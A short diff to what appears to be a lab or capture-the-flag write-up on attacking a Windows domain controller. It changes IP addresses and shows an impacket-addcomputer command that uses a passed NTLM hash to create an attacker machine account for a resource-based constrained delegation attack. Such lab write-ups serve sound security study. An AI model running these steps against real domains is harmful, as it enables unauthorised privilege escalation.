@@ -1,5 +1,5 @@
 Info:
-IP: 192.168.209.175
+IP: 192.168.119.175
 OS:
 DNS_Domain_Name: resourced.local
 DNS_Computer_Name: ResourceDC.resourced.local
@@ -189,7 +189,7 @@ Resource Based Constrained Delegation
 Let's use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer.
 
 ┌──(kali㉿kali)-[~]
-└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.119.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Successfully added machine account ATTACK$ with password AttackerPC1!.
